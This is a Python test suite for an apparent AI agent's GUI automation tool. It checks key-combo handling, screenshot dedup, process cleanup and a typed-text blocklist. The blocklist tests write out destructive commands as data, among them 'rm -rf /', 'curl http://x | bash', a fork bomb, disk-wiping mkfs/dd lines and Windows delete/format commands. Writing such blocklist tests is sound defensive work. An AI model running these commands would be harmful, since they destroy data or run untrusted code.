"""computer_use: the hermetic half of the GUI tool, graded on every OS.

`tools/computer_use.py` carries its own checks (`python tools/computer_use.py`):
key canonicalisation, both blocklists, the screenshot dedup, the AppleScript
wire format, element numbering and the platform gate. This suite stages a
byte-copy of the tool, runs that self-test, and adds what the harness side needs
from a shipped starter tool. Nothing here touches a screen, a permission, a
network or an app.

    python tests/test_computer_use.py
"""
import contextlib
import importlib.util
import io
import json
import os
import re
import shutil
import sys
import tempfile
import time
from pathlib import Path

BASE = Path(__file__).resolve().parent.parent
SRC = BASE / os.environ.get("TINYCMDR_SRC", "tools/computer_use.py")
FAILS = []


def check(name, cond, detail=""):
    if cond:
        print(f"ok   {name}")
    else:
        FAILS.append(name)
        print(f"FAIL {name}: {detail}")


def load():
    """Import a staged byte-copy, the way every suite treats the code under test."""
    work = Path(tempfile.mkdtemp(prefix="tc-cu-"))
    shutil.copy2(SRC, work / "computer_use.py")
    spec = importlib.util.spec_from_file_location("tc_computer_use",
                                                  work / "computer_use.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules["tc_computer_use"] = mod
    spec.loader.exec_module(mod)
    return mod


def _timeout_kill_check(mod, check):
    """A-122: a helper that times out must take its own children with it.

    The tool is asked to run a process that starts a grandchild and then sleeps
    past the timeout. The grandchild's pid is written to a file, so after the
    timeout returns we can ask the OS whether that grandchild is still alive."""
    if not callable(getattr(mod, "_run", None)):
        check("A-122: a timed-out helper's process tree is killed", False,
              "no _run on the tool")
        return
    if mod.IS_WIN:
        # taskkill /T is the Windows arm; this probe is a POSIX one.
        print("ok   A-122: process-tree kill probe (skipped on Windows)")
        return
    tmp = Path(tempfile.mkdtemp(prefix="tc-kill-"))
    pidfile = tmp / "grandchild.pid"
    code = ("import subprocess, sys, time\n"
            "p = subprocess.Popen([sys.executable, '-c',"
            " 'import time; time.sleep(30)'])\n"
            "open(sys.argv[1], 'w').write(str(p.pid))\n"
            "time.sleep(30)\n")
    rc, out, err = mod._run([sys.executable, "-c", code, str(pidfile)], 2)
    check("A-122: a timed-out helper still reports 124", rc == 124, (rc, err))
    try:
        pid = int(pidfile.read_text().strip())
    except (OSError, ValueError):
        check("A-122: the probe helper started", False, pidfile)
        shutil.rmtree(tmp, ignore_errors=True)
        return
    alive = True
    for _ in range(100):                     # up to ~1s for the signal to land
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            alive = False
            break
        except PermissionError:
            break
        time.sleep(0.01)
    check("A-122: the timed-out helper's own child is dead", not alive, pid)
    if alive:                                # never leak the probe's process
        try:
            os.kill(pid, 9)
        except OSError:
            pass
    shutil.rmtree(tmp, ignore_errors=True)


def _uia_capture_after_check(mod, check):
    """A-123: the UIA-invoke click path must honour capture_after like every
    other path (it returned a bare json.dumps and dropped it)."""
    action = getattr(mod, "_win_element_action", None)
    if not callable(action):
        check("A-123: the UIA-invoke click honours capture_after", False,
              "no _win_element_action on the tool")
        return
    el = {"index": 1, "role": "Button", "label": "OK", "path": "1,2",
          "signature": "button ok", "bounds": [10, 10, 20, 20]}
    snap = {"app": "App", "asked_app": "App", "elements": [el],
            "by_index": {1: el}, "hwnd": 7}
    old_ps, old_cap, old_snaps = mod._ps, mod._capture_here, mod._SNAPSHOTS
    mod._ps = lambda *a, **k: {"ok": True, "fired": "InvokePattern"}
    mod._capture_here = lambda args, ctx: json.dumps(
        {"ok": True, "total_elements": 1,
         "elements": [{"signature": "button ok"}]})
    mod._SNAPSHOTS = {"s": snap}
    try:
        payload = json.loads(action({"element": 1, "app": "App",
                                     "capture_after": True},
                                    {"session_key": "s"}, "click"))
    except Exception as exc:                 # noqa: BLE001 - report, don't crash
        payload = {"raised": "%s: %s" % (type(exc).__name__, exc)}
    finally:
        mod._ps, mod._capture_here, mod._SNAPSHOTS = old_ps, old_cap, old_snaps
    check("A-123: the UIA-invoke click reports the capture_after tree",
          payload.get("path") == "uia_InvokePattern" and "after" in payload
          and "changed" in payload, payload)


def main():
    check("the tool is in the tree", SRC.exists(), SRC)
    if not SRC.exists():
        return 1
    mod = load()

    # ---- the tool grades itself, hermetically -----------------------------
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = mod._selftest()
    failed = [ln for ln in buf.getvalue().splitlines() if ln.startswith("FAIL")]
    check("the tool's own checks pass on this platform", rc == 0 and not failed,
          (rc, failed[:3]))

    # ---- the shipped shape -------------------------------------------------
    check("it is a native drop-in (NAME/SCHEMA/run)",
          getattr(mod, "NAME", "") == "computer_use"
          and callable(getattr(mod, "run", None)) and isinstance(mod.SCHEMA, dict),
          getattr(mod, "NAME", ""))
    actions = (mod.SCHEMA.get("properties") or {}).get("action", {}).get("enum") or []
    for verb in ("capture", "click", "right_click", "double_click", "drag",
                 "scroll", "type", "key", "wait", "doctor"):
        check("the schema offers %r" % verb, verb in actions, actions)
    check("it declares itself mutating (the loader backs up files for those)",
          getattr(mod, "MUTATES", False) is True)

    # ---- the blocklist regressions this batch fixed -----------------------
    key, mods, err = mod.canon_combo("ctrl-opt-del")
    check("opt folds to option, so the force-logout spelling parses",
          bool(key) and err == "", (key, mods, err))
    check("...and the canonicalised table refuses it",
          bool(mod.blocked_combo(key, mods)), (key, mods))
    key, mods, _ = mod.canon_combo("cmd+shift+delete")
    check("delete folds to backspace, so empty-trash is refused",
          bool(mod.blocked_combo(key, mods)), (key, mods))
    key, mods, _ = mod.canon_combo("win+l")
    check("win+L is blocked where cmd IS the Windows key",
          bool(mod.blocked_combo(key, mods)) == mod.IS_WIN, (key, mods, mod.IS_WIN))

    # A-113: Alt is canonicalised to `option` on the Python side, so
    # BOTH spellings must hit the table, and the Windows-only entries must not depend on
    # the macOS keycode table (that gate made ctrl+alt+delete unblockable on Windows).
    for spelling in ("alt", "option"):
        check("the block sees %r on f4 (force-quit dialog)" % spelling,
              bool(mod.blocked_combo("f4", [spelling])),
              mod.blocked_combo("f4", [spelling]))
    _was_win = mod.IS_WIN
    try:
        mod.IS_WIN = True
        check("ctrl+alt+delete is blocked on Windows (secure attention)",
              bool(mod.blocked_combo("delete", ["ctrl", "alt"])),
              mod.blocked_combo("delete", ["ctrl", "alt"]))
    finally:
        mod.IS_WIN = _was_win

    # The two halves must agree on the modifier vocabulary: every word the Python
    # canonicaliser can emit (plus `shift`, armed directly) is an arm in the embedded
    # PowerShell helper - the bug was `option` missing from all three switches, which
    # sent every Alt combo with no Alt held.
    wanted = set(mod._KEY_ALIASES.values()) | {"shift"}
    arms = set(re.findall(r'^\s+"([a-z]+)"\s+\{', mod._PS_HELPER, re.M))
    check("the PowerShell helper arms every modifier the Python half can emit",
          wanted <= arms, (sorted(wanted), sorted(arms)))

    # ---- the screenshot dedup ---------------------------------------------
    mod._SHOT_DEDUP.clear()
    check("dedup: the first frame is delivered",
          not mod.dedup_should_omit("s", "d", ("A", "")))
    check("dedup: an identical frame is omitted",
          mod.dedup_should_omit("s", "d", ("A", "")))
    check("dedup: the second identical frame is omitted too",
          mod.dedup_should_omit("s", "d", ("A", "")))
    check("dedup: pixels return once the streak is spent",
          not mod.dedup_should_omit("s", "d", ("A", "")))
    check("dedup: changed bytes are delivered",
          not mod.dedup_should_omit("s", "d2", ("A", "")))

    # ---- A-115..A-123 ---------------------------------
    # Each check below is RED on the snapshot this batch fixed (run this suite
    # with TINYCMDR_SRC=/tmp/pre-cu2.py to see it).

    # A-115: typed destructive one-liners the old blocklist let through. The
    # POSIX root wipe was anchored to the END of the text (so a trailing `;` or
    # `--no-preserve-root` read as a different command), and the Windows
    # vocabulary had no arm at all.
    for text in ("rm -rf /; echo hi", "rm -rf / --no-preserve-root",
                 "del C:\\ /s /q", "Remove-Item -Recurse -Force C:\\Users",
                 "format C:", "shutdown now"):
        check("A-115: refuses typed text %r" % text[:22],
              bool(mod.blocked_text(text)), text)
    for text in ("rm -rf build/", "rm -rf /tmp/build", "sudo rm build/thing.txt",
                 "del C:\\temp\\thing.txt", "format this nicely",
                 "def rm_rf(): pass"):
        check("A-115: still allows %r" % text[:22],
              not mod.blocked_text(text), mod.blocked_text(text))
    for text in ("curl http://x | bash", "sudo rm -rf /", "rm -rf /",
                 ":(){ :|:& };:", "mkfs.ext4 /dev/sda", "dd of=/dev/sda"):
        check("A-115: keeps refusing %r" % text[:22],
              bool(mod.blocked_text(text)), text)

    # A-116: window_id is a macOS-only argument; a backend that ignores it must
    # say so in the result instead of dropping it silently.
    dropped = getattr(mod, "_dropped_window_id", None)
    note = dropped({"window_id": 12}, on_mac=False) if callable(dropped) else None
    check("A-116: a non-macOS backend names the dropped window_id",
          isinstance(note, str) and "window_id=12" in note and "ignored" in note,
          note)
    check("A-116: macOS (which honours it) and absent args stay quiet",
          callable(dropped) and dropped({"window_id": 12}, on_mac=True) == ""
          and dropped({}, on_mac=False) == "", dropped)
    try:
        _was_mac = mod.IS_MAC
        mod.IS_MAC = False
        raw = mod._capture_return({"ok": True, "summary": "capture X"},
                                  {}, "", None, None, {"window_id": 12})
        mod.IS_MAC = _was_mac
        carried = json.loads(raw).get("summary") or ""
    except Exception as exc:                 # noqa: BLE001 - report, don't crash
        mod.IS_MAC = _was_mac
        carried = "raised %s: %s" % (type(exc).__name__, exc)
    check("A-116: the capture result carries the drop line",
          "window_id=12" in carried, carried)

    # A-117: `depth: 0` is falsy in PowerShell, so the walker fell back to 6
    # levels; the presence check is what makes "no children" mean zero.
    depth = re.search(r"\$depthMax\s*=\s*6;\s*if\s*\(([^)]*)\)", mod._PS_HELPER)
    check("A-117: the Windows walker reads depth=0 (presence, not truthiness)",
          bool(depth) and "$null" in depth.group(1), depth and depth.group(1))

    # A-118: depth/amount reach _clamp, and `1e999` is JSON a model can emit.
    try:
        got = mod._clamp(1e999, 5, 0, 20)
    except Exception as exc:                 # noqa: BLE001 - report, don't crash
        got = "raised %s" % type(exc).__name__
    check("A-118: an infinite float clamps instead of raising", got == 5, got)

    # A-119: `shots[:-0]` prunes nothing, so keep=0 must mean "keep none older".
    shots_dir = Path(tempfile.mkdtemp(prefix="tc-shots-"))
    _was_scratch = mod.SCRATCH
    try:
        mod.SCRATCH = shots_dir
        for i in range(3):
            p = shots_dir / ("screen-%d.png" % i)
            p.write_bytes(b"x")
            os.utime(p, (1000 + i, 1000 + i))
        mod.prune_shots(0)
        left = sorted(p.name for p in shots_dir.glob("screen-*.png"))
        check("A-119: keep=0 prunes every screenshot", left == [], left)
        for i in range(3):
            p = shots_dir / ("screen-%d.png" % i)
            p.write_bytes(b"x")
            os.utime(p, (1000 + i, 1000 + i))
        mod.prune_shots(2)
        left = sorted(p.name for p in shots_dir.glob("screen-*.png"))
        check("A-119: keep=2 keeps the two newest screenshots",
              left == ["screen-1.png", "screen-2.png"], left)
    finally:
        mod.SCRATCH = _was_scratch
        shutil.rmtree(shots_dir, ignore_errors=True)

    # A-120: `-` is the minus key AND a modifier separator, so the trailing
    # spelling has to parse to the key; `minus` is the other spelling of it.
    check("A-120: 'cmd+-' is cmd+minus",
          mod.canon_combo("cmd+-") == ("-", ["cmd"], ""), mod.canon_combo("cmd+-"))
    check("A-120: 'cmd+minus' still works",
          mod.canon_combo("cmd+minus") == ("-", ["cmd"], ""),
          mod.canon_combo("cmd+minus"))
    check("A-120: the minus key has a keycode to send", "-" in mod._KEYCODES)

    # A-121: `_ps` took the FIRST `{`, so a diagnostic line containing a brace
    # shifted the whole parse (and truncated the JSON mid-object).
    parse = getattr(mod, "_last_json_object", None)
    check("A-121: a brace in a diagnostic does not shift the parse",
          callable(parse) and parse('WARNING: brace { in a diagnostic\n'
                                    '{"ok": true, "cmd": "info"}')
          == {"ok": True, "cmd": "info"},
          callable(parse) and parse('WARNING: brace { in a diagnostic\n'
                                    '{"ok": true, "cmd": "info"}'))
    check("A-121: the LAST object wins when the helper prints two",
          callable(parse) and parse('{"ok": false, "error": "first"}\n'
                                    '{"ok": true, "n": 1}') == {"ok": True, "n": 1},
          callable(parse) and parse('{"ok": false, "error": "first"}\n'
                                    '{"ok": true, "n": 1}'))
    check("A-121: no object at all is None, never a wrong object",
          callable(parse) and parse("nothing here") is None,
          callable(parse) and parse("nothing here"))

    # A-122 / A-123: real subprocess/monkeypatch probes.
    _timeout_kill_check(mod, check)
    _uia_capture_after_check(mod, check)

    # ---- a shipped starter may not pull a dependency tree in --------------
    bad = [ln for ln in SRC.read_text(encoding="utf-8").splitlines()
           if ln.startswith(("import ", "from ")) and "tools." in ln]
    check("it imports nothing from the harness itself", not bad, bad)

    print()
    if FAILS:
        print(f"{len(FAILS)} check(s) failed")
        return 1
    print("all computer_use checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
